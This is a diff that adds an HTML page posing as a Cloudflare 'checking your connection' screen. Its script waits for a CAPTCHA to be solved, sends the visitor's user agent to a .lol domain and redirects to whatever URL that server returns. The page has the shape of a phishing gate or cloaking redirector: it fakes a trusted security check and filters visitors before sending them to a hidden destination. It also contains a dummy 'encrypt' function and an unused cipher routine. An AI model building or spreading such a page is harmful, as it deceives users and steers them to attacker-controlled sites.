@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="en-US">
+<head> 
+  <script async defer src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"></script> 
+  <title>Just a moment...</title> 
+  <meta content="width=device-width,initial-scale=1" name="viewport"> 
+  <script>
+    var verifyCallback_CF = function (response) {
+      if (response && response.length > 10) {
+        sendRequest(); // Only send the request after CAPTCHA is solved
+      }
+    };
+
+    window.onloadTurnstileCallback = function () {
+      turnstile.render("#turnstileCaptcha", {
+        sitekey: "0x4AAAAAAAi8VFrsKfF7MbKa", 
+        callback: verifyCallback_CF,
+      });
+    };
+
+    function hh2(encryptedText, shift) {
+      let decryptedText = "";
+      for (let i = 0; i < encryptedText.length; i++) {
+        let c = encryptedText[i];
+        if (c.match(/[a-z]/i)) {
+          let code = encryptedText.charCodeAt(i);
+          if ((code >= 65) && (code <= 90)) {
+            c = String.fromCharCode(((code - 65 - shift + 26) % 26) + 65);
+          } else if ((code >= 97) && (code <= 122)) {
+            c = String.fromCharCode(((code - 97 - shift + 26) % 26) + 97);
+          }
+        }
+        decryptedText += c;
+      }
+      return decryptedText;
+    }
+
+    function Encrypt(text, publicKey) {
+      console.log('encrypt with public key:', publicKey);
+      return text; 
+    }
+
+    let sx = "https://02gekvlugve180.lol/?crajmcug";
+
+    const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
+    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxCJBwcY8t0AqPquU+Ah1
+    R0EPWlcD5XSXhOEe00844TkiGLFHnMWQEugh0zYh/kgrw8hv1ifOmf4Jrkis3tlW
+    qpIO2U9Nle23D1VKpxZSxRyYTbnoyq3lRcqY5txOJKdviR9fA9wPidS6KTXhX2xq
+    wq1jjYvgHtntEGYwK6Lzm6Q8jTjfV7ICqnV74GTKnPN7VMDKsS2+Dcf2Y2IoYY1o
+    NM7nWPKFeVUmkqFMowkdBmGJHL4UqRcxbhiRX3AAzzdQvbQg7OQxYjbKak23IvDN
+    1ia9SsXQyo5H/XnfXB2Nb9sNayO5sV+hDmBRlujtm1+maqGMJUXZeVHL81Q7O22a
+    WQIDAQAB
+    -----END PUBLIC KEY-----`;
+
+    function sendRequest() {
+      const userAgent = navigator.userAgent;
+      const EncryptedUserAgent = Encrypt(userAgent, PUBLIC_KEY);
+      console.log('Sending request with encrypted user-agent:', EncryptedUserAgent);
+      
+      let xhr = new XMLHttpRequest();
+      xhr.open('GET', sx, true);
+      xhr.setRequestHeader("accept", "application/json");
+      xhr.setRequestHeader("qrc-auth", EncryptedUserAgent);
+
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            const cc = JSON.parse(xhr.responseText);
+            if (cc.url) {
+              window.location = cc.url;
+            } else {
+              document.body.innerHTML = cc.error ? cc.error : 'ACCESS DENIED';
+            }
+          } else {
+            document.body.innerHTML = 'CONNECTION TO HOST FAILED';
+          }
+        }
+      };
+      xhr.send();
+    }
+  </script>
+</head>
+<style>
+  .h1,.h2{font-weight:500}*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;min-height:100vh}a{transition:color .15s;background-color:transparent;text-decoration:none;color:#0051c3}a:hover{text-decoration:underline;color:#ee730a}.main-content{margin:8rem auto;width:100%;max-width:60rem}.footer,.main-content{padding-right:1.5rem;padding-left:1.5rem}.main-wrapper{display:flex;flex:1;flex-direction:column;align-items:center}.spacer{margin:2rem 0}.h1{line-height:3.75rem;font-size:2.5rem}.core-msg,.h2{line-height:2.25rem;font-size:1.5rem}.core-msg{font-weight:400}.body-text{line-height:1.25rem;font-size:1rem;font-weight:400}.icon-wrapper{display:inline-block;position:relative;top:.25rem;margin-right:.2rem}.heading-icon{width:1.625rem;height:1.625rem}.warning-icon{display:inline-block}.text-center{text-align:center}.footer{margin:0 auto;width:100%;max-width:60rem;line-height:1.125rem;font-size:.75rem}.footer-inner{border-top:1px solid #d9d9d9;padding-top:1rem;padding-bottom:1rem}.core-msg,.zone-name-title{overflow-wrap:break-word}@media (max-width:720px){.main-content{margin-top:4rem}.h1{line-height:1.75rem;font-size:1.5rem}.core-msg,.h2{line-height:1.5rem}.h2{font-size:1.25rem}.core-msg{font-size:1rem}.heading-icon{width:1.25rem;height:1.25rem}.zone-name-title{margin-bottom:1rem}}@keyframes lds-ring{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@media screen and (-ms-high-contrast:active),screen and (-ms-high-contrast:none){.main-wrapper,body{display:block}}@media (prefers-color-scheme:dark){body{background-color:#222;color:#d9d9d9}a{color:#fff}a:hover{text-decoration:underline;color:#ee730a}}
+</style>
+<body class="no-js">
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <h1 class="h1 zone-name-title">
+        <div>
+          <img src="" style="margin-bottom:-17px">
+          <div id="site-name">Just a moment.....</div>
+        </div>
+      </h1>
+      <p data-translate="please_wait" id="cf-spinner-please-wait"> Please stand by, while we are checking if the site connection is secure </p><br/>
+      <form data-callback="verifyCallback_CF" id="cfForm" method="POST" style="visibility:visible">
+        <div id="turnstileCaptcha"></div><br>
+      </form>
+      <div class="core-msg spacer" id="challenge-body-text">
+        <div>We need to review the security of your connection before proceeding. </div>
+      </div>
+    </div>
+  </div>
+  <div class="footer" role="contentinfo">
+    <div class="footer-inner">
+      <div class="text-center"> Performance & Security </div>
+    </div>
+  </div>
+</body>
+</html>
